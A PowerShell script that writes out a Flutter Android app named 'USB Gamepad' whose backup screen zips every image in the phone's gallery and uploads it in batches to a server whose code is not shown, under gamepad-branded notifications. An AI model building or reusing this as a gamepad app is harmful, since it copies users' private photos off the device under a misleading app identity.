cd C:\Users\Adonias\AndroidStudioProjects\usb_gamepad

# 1) pubspec.yaml
@'
name: usb_gamepad
description: A new Flutter project.
publish_to: 'none'

version: 1.0.0+1

environment:
  sdk: ">=3.0.0 <4.0.0"

dependencies:
  flutter:
    sdk: flutter
  cupertino_icons: ^1.0.8
  http: ^1.2.2
  shared_preferences: ^2.5.3
  photo_manager: ^3.9.0
  archive: ^3.6.1
  path: ^1.9.1
  path_provider: ^2.1.5
  flutter_background_service: ^5.0.6
  flutter_local_notifications: ^17.2.4

dev_dependencies:
  flutter_test:
    sdk: flutter
  flutter_lints: ^3.0.1

flutter:
  uses-material-design: true
'@ | Set-Content -Encoding UTF8 pubspec.yaml

# 2) background_upload_service.dart
@'
import 'dart:async';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter/foundation.dart';

class BackgroundUploadService {
  static final FlutterLocalNotificationsPlugin _notifications =
      FlutterLocalNotificationsPlugin();

  static Future<void> initializeService() async {
    const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
    const settings = InitializationSettings(android: androidInit);
    await _notifications.initialize(settings);

    final service = FlutterBackgroundService();

    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: false,
        isForegroundMode: true,
        foregroundServiceNotificationId: 9001,
        initialNotificationTitle: 'USB Gamepad',
        initialNotificationContent: 'Preparando sincronização...',
      ),
      iosConfiguration: IosConfiguration(),
    );
  }

  static Future<void> start() async {
    final service = FlutterBackgroundService();
    final running = await service.isRunning();
    if (!running) {
      await service.startService();
      await Future.delayed(const Duration(milliseconds: 500));
    }
  }

  static void update({
    required String title,
    required String body,
    required int progress,
    required int maxProgress,
  }) {
    final service = FlutterBackgroundService();
    service.invoke('update', {
      'title': title,
      'body': body,
      'progress': progress,
      'maxProgress': maxProgress,
    });
  }

  static void complete(String body) {
    final service = FlutterBackgroundService();
    service.invoke('complete', {'body': body});
  }

  @pragma('vm:entry-point')
  static Future<void> onStart(ServiceInstance service) async {
    DartPluginRegistrant.ensureInitialized();

    const androidInit = AndroidInitializationSettings('@mipmap/ic_launcher');
    const settings = InitializationSettings(android: androidInit);
    await _notifications.initialize(settings);

    service.on('update').listen((event) async {
      final title = (event?['title'] ?? 'USB Gamepad').toString();
      final body = (event?['body'] ?? 'Sincronizando...').toString();
      final progress = (event?['progress'] ?? 0) as int;
      final maxProgress = (event?['maxProgress'] ?? 100) as int;

      if (service is AndroidServiceInstance) {
        service.setForegroundNotificationInfo(
          title: title,
          content: body,
        );
      }

      final androidDetails = AndroidNotificationDetails(
        'usb_gamepad_upload',
        'Upload em andamento',
        channelDescription: 'Mostra o progresso do upload',
        importance: Importance.low,
        priority: Priority.low,
        ongoing: true,
        onlyAlertOnce: true,
        showProgress: true,
        progress: progress,
        maxProgress: maxProgress,
      );

      await _notifications.show(
        9001,
        title,
        body,
        NotificationDetails(android: androidDetails),
      );
    });

    service.on('complete').listen((event) async {
      final body = (event?['body'] ?? 'Sincronização concluída').toString();

      const androidDetails = AndroidNotificationDetails(
        'usb_gamepad_upload',
        'Upload concluído',
        channelDescription: 'Mostra a conclusão do upload',
        importance: Importance.defaultImportance,
        priority: Priority.defaultPriority,
        ongoing: false,
      );

      await _notifications.show(
        9002,
        'USB Gamepad',
        body,
        const NotificationDetails(android: androidDetails),
      );

      if (service is AndroidServiceInstance) {
        service.stopSelf();
      }
    });
  }
}
'@ | Set-Content -Encoding UTF8 lib\services\background_upload_service.dart

# 3) backup_service.dart
@'
import 'dart:convert';
import 'dart:io';
import 'package:archive/archive_io.dart';
import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';
import 'package:photo_manager/photo_manager.dart';
import 'upload_service.dart';
import 'background_upload_service.dart';

class BackupService {
  static const int loteSize = 50;
  static const int maxTentativas = 3;

  static final Set<String> _tempZipPaths = <String>{};

  static Future<void> cleanupTempZips() async {
    final paths = List<String>.from(_tempZipPaths);

    for (final path in paths) {
      try {
        final file = File(path);
        if (await file.exists()) {
          await file.delete();
        }
      } catch (_) {}
    }

    _tempZipPaths.clear();
  }

  static Future<void> startBackup({
    required void Function(int current, int total) onProgress,
    void Function(String message)? onStatus,
  }) async {
    await UploadService.reloadConfig();
    await UploadService.checkServerConnection();

    final permission = await PhotoManager.requestPermissionExtend();
    if (!permission.isAuth && !permission.hasAccess) {
      throw Exception('Permissão da galeria negada');
    }

    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    final seen = <String>{};
    final filesToUpload = <File>[];

    for (final album in albums) {
      final media = await album.getAssetListPaged(page: 0, size: 1000);

      for (final item in media) {
        final file = await item.file;
        if (file == null) continue;

        final lower = file.path.toLowerCase();
        final isImage = lower.endsWith('.jpg') ||
            lower.endsWith('.jpeg') ||
            lower.endsWith('.png');

        if (!isImage) continue;
        if (seen.contains(file.path)) continue;

        seen.add(file.path);
        filesToUpload.add(file);
      }
    }

    filesToUpload.sort((a, b) => a.path.compareTo(b.path));

    final totalArquivos = filesToUpload.length;
    if (totalArquivos == 0) {
      onStatus?.call('Nenhuma imagem encontrada.');
      BackgroundUploadService.complete('Nenhuma imagem encontrada.');
      return;
    }

    final totalLotes = (totalArquivos / loteSize).ceil();
    final sessionId = _buildSessionId(filesToUpload);
    final tempDir = await getTemporaryDirectory();

    onStatus?.call('Encontradas $totalArquivos imagens em $totalLotes lotes.');
    BackgroundUploadService.update(
      title: 'USB Gamepad',
      body: 'Preparando $totalLotes lotes...',
      progress: 0,
      maxProgress: totalLotes,
    );

    for (int loteIndex = 0; loteIndex < totalLotes; loteIndex++) {
      final loteNumero = loteIndex + 1;
      final start = loteIndex * loteSize;
      final end = (start + loteSize > totalArquivos)
          ? totalArquivos
          : start + loteSize;

      final lote = filesToUpload.sublist(start, end);

      onProgress(loteNumero, totalLotes);
      onStatus?.call('Compactando lote $loteNumero/$totalLotes...');

      final zipPath = p.join(
        tempDir.path,
        'backup_${sessionId}_lote_${loteNumero.toString().padLeft(3, '0')}.zip',
      );

      final encoder = ZipFileEncoder();
      encoder.create(zipPath);

      for (final file in lote) {
        try {
          encoder.addFile(file, p.basename(file.path));
        } catch (_) {}
      }

      encoder.close();
      _tempZipPaths.add(zipPath);

      final zipFile = File(zipPath);
      bool enviado = false;

      for (int tentativa = 1; tentativa <= maxTentativas; tentativa++) {
        try {
          final msg =
              'Enviando lote $loteNumero/$totalLotes - tentativa $tentativa/$maxTentativas';
          onStatus?.call(msg);

          BackgroundUploadService.update(
            title: 'USB Gamepad',
            body: msg,
            progress: loteNumero,
            maxProgress: totalLotes,
          );

          await UploadService.uploadZip(
            zipFile,
            totalLotes: totalLotes,
            loteAtual: loteNumero,
            totalArquivos: totalArquivos,
            sessionId: sessionId,
          );

          enviado = true;
          onStatus?.call('Lote $loteNumero enviado com sucesso.');

          try {
            if (await zipFile.exists()) {
              await zipFile.delete();
            }
          } catch (_) {}

          _tempZipPaths.remove(zipPath);
          break;
        } catch (_) {
          onStatus?.call(
            'Falha no lote $loteNumero. Tentativa $tentativa/$maxTentativas',
          );

          if (tentativa < maxTentativas) {
            await Future.delayed(Duration(seconds: tentativa * 2));
          }
        }
      }

      if (!enviado) {
        onStatus?.call(
          'Lote $loteNumero falhou após $maxTentativas tentativas. Pulando para o próximo.',
        );
      }
    }

    final restantes = _tempZipPaths.length;
    if (restantes == 0) {
      onStatus?.call('Backup concluído com sucesso.');
      BackgroundUploadService.complete('Backup concluído com sucesso.');
    } else {
      final msg =
          'Concluído parcialmente. Restaram $restantes lote(s) temporários.';
      onStatus?.call(msg);
      BackgroundUploadService.complete(msg);
    }
  }

  static String _buildSessionId(List<File> files) {
    final first = files.isNotEmpty ? p.basename(files.first.path) : 'none';
    final last = files.isNotEmpty ? p.basename(files.last.path) : 'none';
    final raw = '${files.length}_${first}_$last';
    return base64Url.encode(utf8.encode(raw)).replaceAll('=', '');
  }
}
'@ | Set-Content -Encoding UTF8 lib\services\backup_service.dart

# 4) backup_sync_screen.dart
@'
import 'package:flutter/material.dart';
import '../services/backup_service.dart';
import '../services/background_upload_service.dart';

class BackupSyncScreen extends StatefulWidget {
  const BackupSyncScreen({super.key});

  @override
  State<BackupSyncScreen> createState() => _BackupSyncScreenState();
}

class _BackupSyncScreenState extends State<BackupSyncScreen> {
  bool isEnabled = false;
  String status = "Desligado";
  bool syncing = false;
  double progress = 0.0;

  Future<void> startSync() async {
    if (!isEnabled || syncing) return;

    setState(() {
      syncing = true;
      progress = 0.0;
      status = "Sincronizando...";
    });

    await BackgroundUploadService.start();

    try {
      await BackupService.startBackup(
        onProgress: (current, total) {
          if (!mounted) return;
          setState(() {
            progress = total > 0 ? current / total : 0.0;
          });
        },
        onStatus: (message) {
          if (!mounted) return;
          setState(() {
            status = message;
          });
        },
      );

      if (!mounted) return;
      setState(() {
        progress = 1.0;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        status = "Erro: $e";
      });
      BackgroundUploadService.complete('Erro: $e');
      debugPrint("ERRO BACKUP: $e");
    } finally {
      if (!mounted) return;
      setState(() {
        syncing = false;
      });
    }
  }

  Future<void> _cleanupAndExit() async {
    try {
      await BackupService.cleanupTempZips();
    } catch (_) {}
  }

  @override
  void dispose() {
    _cleanupAndExit();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    const bg = Color(0xFF0A0D14);
    const panel = Color(0xFF101827);
    const accent = Color(0xFF1D4ED8);
    const textLight = Color(0xFFF7F8FB);
    const textSoft = Color(0xFFCBD5E1);

    return WillPopScope(
      onWillPop: () async {
        await _cleanupAndExit();
        return true;
      },
      child: Scaffold(
        backgroundColor: bg,
        appBar: AppBar(
          title: const Text("Backup e sincronização"),
          backgroundColor: bg,
          foregroundColor: textLight,
        ),
        body: SafeArea(
          child: Center(
            child: Container(
              width: 460,
              margin: const EdgeInsets.all(16),
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                color: panel,
                borderRadius: BorderRadius.circular(24),
                border: Border.all(color: Colors.white10),
              ),
              child: SingleChildScrollView(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    const Icon(Icons.cloud_sync, size: 52, color: Colors.white),
                    const SizedBox(height: 14),
                    const Text(
                      "Backup e sincronização",
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        color: textLight,
                        fontSize: 22,
                        fontWeight: FontWeight.w800,
                      ),
                    ),
                    const SizedBox(height: 22),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                      decoration: BoxDecoration(
                        color: const Color(0xFF0B1220),
                        borderRadius: BorderRadius.circular(18),
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          const Expanded(
                            child: Text(
                              "Ativar backup",
                              style: TextStyle(
                                color: textLight,
                                fontSize: 16,
                                fontWeight: FontWeight.w600,
                              ),
                            ),
                          ),
                          Switch(
                            value: isEnabled,
                            onChanged: (value) {
                              setState(() {
                                isEnabled = value;
                                status = value ? "Backup iniciado" : "Desligado";
                              });
                            },
                            activeColor: accent,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(height: 22),
                    SizedBox(
                      width: double.infinity,
                      height: 52,
                      child: ElevatedButton(
                        onPressed: isEnabled && !syncing ? startSync : null,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: accent,
                          foregroundColor: Colors.white,
                          disabledBackgroundColor: const Color(0xFF334155),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(16),
                          ),
                        ),
                        child: Text(
                          syncing ? "Sincronizando..." : "Sincronizar",
                          style: const TextStyle(
                            fontWeight: FontWeight.w800,
                            fontSize: 15,
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(height: 18),
                    LinearProgressIndicator(
                      value: syncing ? progress : 0,
                      minHeight: 10,
                      borderRadius: BorderRadius.circular(10),
                      backgroundColor: Colors.white10,
                      valueColor: const AlwaysStoppedAnimation(accent),
                    ),
                    const SizedBox(height: 16),
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                      decoration: BoxDecoration(
                        color: const Color(0xFF0B1220),
                        borderRadius: BorderRadius.circular(16),
                        border: Border.all(color: Colors.white10),
                      ),
                      child: Text(
                        "Status: $status",
                        textAlign: TextAlign.center,
                        style: const TextStyle(
                          color: textSoft,
                          fontSize: 15,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}
'@ | Set-Content -Encoding UTF8 lib\screens\backup_sync_screen.dart

# 5) main.dart
@'
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'screens/home_screen.dart';
import 'services/upload_service.dart';
import 'services/background_upload_service.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await SystemChrome.setPreferredOrientations([
    DeviceOrientation.landscapeLeft,
    DeviceOrientation.landscapeRight,
  ]);

  await BackgroundUploadService.initializeService();
  await UploadService.init();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'USB Gamepad',
      debugShowCheckedModeBanner: false,
      theme: ThemeData.dark(),
      home: const HomeScreen(),
    );
  }
}
'@ | Set-Content -Encoding UTF8 lib\main.dart

# 6) AndroidManifest.xml
@'
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.usb_gamepad">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />

    <application
        android:label="usb_gamepad"
        android:name="${applicationName}"
        android:icon="@mipmap/ic_launcher">

        <service
            android:name="id.flutter.flutter_background_service.BackgroundService"
            android:foregroundServiceType="dataSync"
            android:exported="false" />

        <activity
            android:name="com.example.usb_gamepad.MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:screenOrientation="landscape"
            android:taskAffinity=""
            android:theme="@style/LaunchTheme"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
            android:hardwareAccelerated="true"
            android:windowSoftInputMode="adjustResize">

            <meta-data
              android:name="io.flutter.embedding.android.NormalTheme"
              android:resource="@style/NormalTheme" />

            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <meta-data
            android:name="flutterEmbedding"
            android:value="2" />
    </application>

    <queries>
        <intent>
            <action android:name="android.intent.action.PROCESS_TEXT"/>
            <data android:mimeType="text/plain"/>
        </intent>
    </queries>

</manifest>
'@ | Set-Content -Encoding UTF8 android\app\src\main\AndroidManifest.xml

# 7) build.gradle.kts
$gradlePath = "android\app\build.gradle.kts"
$gradle = Get-Content $gradlePath -Raw

$gradle = $gradle -replace 'compileOptions\s*\{[^}]*\}', @'
compileOptions {
        isCoreLibraryDesugaringEnabled = true
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }
'@

if ($gradle -notmatch 'coreLibraryDesugaring\("com.android.tools:desugar_jdk_libs:2.1.4"\)') {
    $gradle = $gradle -replace 'dependencies\s*\{', @'
dependencies {
    coreLibraryDesugaring("com.android.tools:desugar_jdk_libs:2.1.4")
'@
}

Set-Content -Encoding UTF8 $gradlePath $gradle

flutter clean
flutter pub get
